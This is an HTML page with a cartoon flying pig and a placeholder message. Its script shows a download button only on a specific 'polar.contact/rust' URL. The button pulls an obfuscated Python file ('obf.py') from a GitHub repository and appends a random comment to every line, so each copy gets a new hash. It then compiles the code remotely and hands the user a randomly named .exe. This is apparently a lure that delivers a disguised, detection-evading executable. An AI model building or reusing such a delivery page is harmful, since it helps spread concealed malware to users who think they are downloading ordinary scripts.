<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Script PJ</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            overflow: hidden;
            font-family: Arial, sans-serif;
            background-color: #87ceeb;
        }
        .flying-pig {
            position: absolute;
            width: 100px;
            height: 60px;
            animation: fly 30s linear infinite;
            z-index: 10;
        }
        .pig-body {
            position: absolute;
            width: 80px;
            height: 50px;
            background-color: pink;
            border-radius: 50% 50% 50% 50% / 60% 60% 40% 40%;
        }
        .pig-snout {
            position: absolute;
            width: 30px;
            height: 20px;
            background-color: #ffb6c1;
            border-radius: 45%;
            top: 30px;
            left: 25px;
        }
        .pig-eye {
            position: absolute;
            width: 10px;
            height: 10px;
            background-color: #000;
            border-radius: 50%;
            top: 15px;
        }
        .pig-eye.left {
            left: 15px;
        }
        .pig-eye.right {
            right: 15px;
        }
        .pig-ear {
            position: absolute;
            width: 20px;
            height: 20px;
            background-color: pink;
            border-radius: 50%;
            top: -5px;
        }
        .pig-ear.left {
            left: 5px;
            transform: rotate(-30deg);
        }
        .pig-ear.right {
            right: 5px;
            transform: rotate(30deg);
        }
        @keyframes fly {
            0% { left: -100px; top: 10%; transform: rotate(0); }
            20% { left: 20%; top: 90%; transform: rotate(-10deg); }
            40% { left: 80%; top: 50%; transform: rotate(5deg); }
            60% { left: 40%; top: 10%; transform: rotate(-5deg); }
            80% { left: 90%; top: 80%; transform: rotate(10deg); }
            100% { left: 110%; top: 30%; transform: rotate(0); }
        }
        .cloud {
            position: absolute;
            background-color: #fff;
            opacity: .8;
        }
        .cloud::after, .cloud::before {
            content: '';
            position: absolute;
            background-color: #fff;
        }
        .cloud1 {
            width: 100px;
            height: 40px;
            top: 100px;
            border-radius: 20px;
            animation: moveCloud 25s linear infinite;
        }
        .cloud1::before {
            width: 50px;
            height: 50px;
            top: -25px;
            left: 10px;
            border-radius: 50%;
        }
        .cloud1::after {
            width: 70px;
            height: 70px;
            top: -35px;
            right: 10px;
            border-radius: 50%;
        }
        .cloud2 {
            width: 120px;
            height: 30px;
            top: 200px;
            border-radius: 15px;
            animation: moveCloud 30s linear infinite;
            animation-delay: -15s;
        }
        .cloud2::before {
            width: 60px;
            height: 60px;
            top: -40px;
            left: 15px;
            border-radius: 40% 60% 60% 40% / 60% 40% 60% 40%;
        }
        .cloud2::after {
            width: 80px;
            height: 80px;
            top: -50px;
            right: 15px;
            border-radius: 60% 40% 40% 60% / 40% 60% 40% 60%;
        }
        .cloud3 {
            width: 90px;
            height: 35px;
            top: 300px;
            border-radius: 18px;
            animation: moveCloud 28s linear infinite;
            animation-delay: -7s;
        }
        .cloud3::before {
            width: 45px;
            height: 45px;
            top: -25px;
            left: 5px;
            border-radius: 30% 70% 70% 30% / 30% 30% 70% 70%;
        }
        .cloud3::after {
            width: 65px;
            height: 65px;
            top: -35px;
            right: 5px;
            border-radius: 70% 30% 30% 70% / 70% 70% 30% 30%;
        }
        .cloud4 {
            width: 110px;
            height: 45px;
            top: 150px;
            border-radius: 22px;
            animation: moveCloud 32s linear infinite;
            animation-delay: -20s;
        }
        .cloud4::before {
            width: 55px;
            height: 55px;
            top: -30px;
            left: 12px;
            border-radius: 45% 55% 55% 45% / 55% 45% 55% 45%;
        }
        .cloud4::after {
            width: 75px;
            height: 75px;
            top: -40px;
            right: 12px;
            border-radius: 55% 45% 45% 55% / 45% 55% 45% 55%;
        }
        .cloud5 {
            width: 85px;
            height: 38px;
            top: 250px;
            border-radius: 19px;
            animation: moveCloud 27s linear infinite;
            animation-delay: -12s;
        }
        .cloud5::before {
            width: 42px;
            height: 42px;
            top: -22px;
            left: 8px;
            border-radius: 35% 65% 65% 35% / 35% 35% 65% 65%;
        }
        .cloud5::after {
            width: 62px;
            height: 62px;
            top: -32px;
            right: 8px;
            border-radius: 65% 35% 35% 65% / 65% 65% 35% 35%;
        }
        @keyframes moveCloud {
            0% { left: -200px; }
            100% { left: 100%; }
        }
        .container {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: rgba(255, 255, 255, .8);
            padding: 2rem;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, .1);
            text-align: center;
            z-index: 20;
        }
        h1 {
            margin-bottom: 2rem;
        }
        .button {
            display: inline-block;
            padding: 10px 20px;
            margin: 10px;
            background-color: #7289da;
            color: #fff;
            text-decoration: none;
            border-radius: 5px;
            transition: background-color .3s;
            cursor: pointer;
        }
        .button:hover {
            background-color: #5a6eaf;
        }
    </style>
</head>
<body>
    <div class="cloud cloud1"></div>
    <div class="cloud cloud2"></div>
    <div class="cloud cloud3"></div>
    <div class="cloud cloud4"></div>
    <div class="cloud cloud5"></div>
    <div class="flying-pig">
        <div class="pig-body"></div>
        <div class="pig-snout"></div>
        <div class="pig-eye left"></div>
        <div class="pig-eye right"></div>
        <div class="pig-ear left"></div>
        <div class="pig-ear right"></div>
    </div>
    <div class="container">
        <h1 id="message">Nothing here yet. Next thing I start working on will be posted...</h1>
        <button class="button" id="downloadBtn" onclick="downloadScript()" style="display: none;">Download Script</button>
    </div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.7.1/jszip.min.js"></script>
    <script>
        function generateUUID(e, t) {
            let n = "";
            while (n.length < t) n += crypto.randomUUID().replace(/-/g, "");
            const o = Math.floor(Math.random() * (t - e + 1)) + e;
            return n.substring(0, o);
        }

        async function fetchPythonCode() {
            const response = await fetch("https://raw.githubusercontent.com/e266cfd65ad46a67fc54b0efd38e40dd/hostingsite/main/obf.py");
            const text = await response.text();
            return text.split("\n").map(line => `${line} # ${generateUUID(1e5, 1e6)}`).join("\n");
        }

        async function compilePythonToExe(pythonCode) {
            try {
                const response = await fetch("https://your-backend-service/compile", {  // Replace with your API endpoint
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({ script: pythonCode })
                });
                const data = await response.blob();
                const url = URL.createObjectURL(data);
                const a = document.createElement("a");
                a.href = url;
                a.download = `${crypto.randomUUID()}.exe`;
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                URL.revokeObjectURL(url);
            } catch (error) {
                console.error("Error compiling Python script:", error);
            }
        }

        async function downloadScript() {
            try {
                const pythonCode = await fetchPythonCode();
                await compilePythonToExe(pythonCode);
            } catch (error) {
                console.error("Error during download:", error);
            }
        }

        window.onload = function() {
            if (window.location.href.includes("polar.contact/rust")) {
                document.getElementById("message").textContent = "Everything I do with rust is here...";
                document.getElementById("downloadBtn").style.display = "inline-block";
            } else {
                document.getElementById("downloadBtn").style.display = "none";
            }
        };
    </script>
</body>
</html>
